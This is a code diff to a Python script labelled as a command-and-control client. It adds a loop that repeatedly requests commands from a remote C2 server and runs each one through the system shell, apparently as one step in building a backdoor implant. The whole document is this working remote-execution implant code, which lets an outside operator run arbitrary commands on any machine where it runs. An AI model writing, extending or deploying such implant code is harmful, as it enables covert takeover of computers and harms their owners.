@@ -1,6 +1,7 @@
 # Command and Control client Code
 
 from os import getenv
+from subprocess import run, PIPE, STDOUT
 from time import sleep, time
 from requests import exceptions, get
 from sys import platform
@@ -40,11 +41,18 @@ else:
     client = "unknown" + "@" + "unknown" + "@" + str(time())
 
 while True:
-    # Try an HTTP GET request to the c2 server and retrive a command; if it fails, keep trying forever
+    # Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
     try:
-        command = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
-        print(command.status_code)
+        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
     except exceptions.RequestException:
-        print("Server is down.")
         sleep(DELAY)
         continue
+    
+    # Retrieve the command via the decoded content ot the response object
+    command = response.content.decode()
+
+    # Run our operating system command via the subprocess module's run function
+    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
+    print(command_output.stdout.decode())
+
+    print(response.status_code)
